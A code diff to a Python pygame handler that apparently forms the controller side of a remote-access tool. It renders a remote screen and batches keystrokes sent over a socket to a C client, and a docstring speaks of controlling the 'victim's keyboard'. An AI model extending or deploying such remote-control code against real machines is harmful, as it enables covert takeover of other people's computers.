@@ -36,6 +36,7 @@ def toggleVideo(state, mainSock):
 	global videoThreadHandle
 	global threadRun
 
+	# if starting threads when they haven't been started
 	if state and not threadRun:
 		# check if any threads are running when they shouldn't be
 		fail = False
@@ -53,8 +54,8 @@ def toggleVideo(state, mainSock):
 		pygameThreadHandle = pygameThread(mainSock)
 		videoThreadHandle.start()
 		pygameThreadHandle.start()
-	else:
-		pygameThreadRun = False
+	elif not state:
+		threadRun = False
 
 """
 	Enable/disable control of victim's keyboard
@@ -178,8 +179,6 @@ def pygameHandler(mainSock):
 			imageDirty = False
 			imageLock.release()
 			dirty = True
-		# DEBUG
-		#print(meta)
 		# create the new surface if we got a new frame
 		if dirty:
 			surf = pygame.image.frombuffer(buff, (meta[BASE_WIDTH], meta[BASE_HEIGHT]), "RGBA")
@@ -193,7 +192,7 @@ def pygameHandler(mainSock):
 				scaledHeight = windowSize[1]
 			scaledWidth = scaledWidth * zoom
 			scaledHeight = scaledHeight * zoom
-			surf = pygame.transform.scale(surf, (int(scaledWidth), int(scaledHeight))) # scale the image to fit the window
+			surf = pygame.transform.smoothscale(surf, (int(scaledWidth), int(scaledHeight))) # scale the image to fit the window
 		
 		# check if dirty bit is set to draw the next frame
 		if surf and dirty:
@@ -207,13 +206,13 @@ def pygameHandler(mainSock):
 		elif dirty: # dirty bit was set but the image to draw is None
 			print("surf is NONE!")
 
-		#pygame.display.flip()
-
 		# event handling
+		inputList = bytes([START_INPUT])
 		for event in pygame.event.get():
 			if event.type == pygame.QUIT: # was the windows closed?
 				return
 			elif event.type == pygame.KEYDOWN: # key was pressed down
+				print(f'Key {event.unicode} pressed')
 				if event.mod & pygame.KMOD_RCTRL: # right control is pressed down
 					dirty = True # assume that the image is mooved or resized
 					if event.key == pygame.K_UP: # move up - push image down - increase offsetY
@@ -226,12 +225,8 @@ def pygameHandler(mainSock):
 						offsetX = offsetX - (STEP_FACTOR * zoom)
 					elif event.key == pygame.K_KP_PLUS or event.key == pygame.K_PLUS: # zoom in
 						zoom = zoom + ZOOM_FACTOR # zoom is done linearly - 100%, 110%, 120%, 130%, etc
-						surfSize = surf.get_size()
-						surf = pygame.transform.scale(surf, (int(surfSize[0] * (1 + ZOOM_FACTOR)), int(surfSize[1] * (1 + ZOOM_FACTOR))))
 					elif event.key == pygame.K_KP_MINUS or event.key == pygame.K_MINUS:
 						zoom = zoom - ZOOM_FACTOR
-						surfSize = surf.get_size()
-						surf = pygame.transform.scale(surf, (int(surfSize[0] * (1 - ZOOM_FACTOR)), int(surfSize[1] * (1 - ZOOM_FACTOR))))
 					elif event.key == pygame.K_c or event.key == pygame.K_r: # center the image and possibly reset the zoom
 						offsetX = 0
 						offsetY = 0
@@ -242,13 +237,13 @@ def pygameHandler(mainSock):
 				elif keyboardControl: # right control was not pressed down and we're sending keyboard inputs
 					if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
 						code = KEY_DICT[event.key]
-						mainSock.sendall(bytes([KEY_DOWN, code]) + b'\0')
+						inputList += bytes([KEY_DOWN, code, CONT_INPUT])
 					else: # TODO - debugging purposes only
 						print("Key does not map to Windows virtual-key code!")
 			elif event.type == pygame.KEYUP and keyboardControl: # key was released and we're sending keyboard inputs
 				if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
 					code = KEY_DICT[event.key]
-					mainSock.sendall(bytes([KEY_UP, code]) + b'\0')
+					inputList += bytes([KEY_UP, code, CONT_INPUT])
 				else: # TODO - debugging purposes only
 					print("Key does not map to Windows virtual-key code!")
 			elif event.type == pygame.MOUSEMOTION and mouseControl:
@@ -257,6 +252,12 @@ def pygameHandler(mainSock):
 				print("TODO")
 			elif event.type == pygame.MOUSEBUTTONUP and mouseControl:
 				print("TODO")
+		# are there any inputs to send to the C client?
+		if len(inputList) > 1:
+			# replace the last CONT_INPUT byte with a null-terminator and send the input string
+			#inputList = inputList[:-1] + b'\0'
+			mainSock.sendall(inputList[:-1] + b'\0')
+
 
 	# we've broken out of the loop
 	pygame.quit()
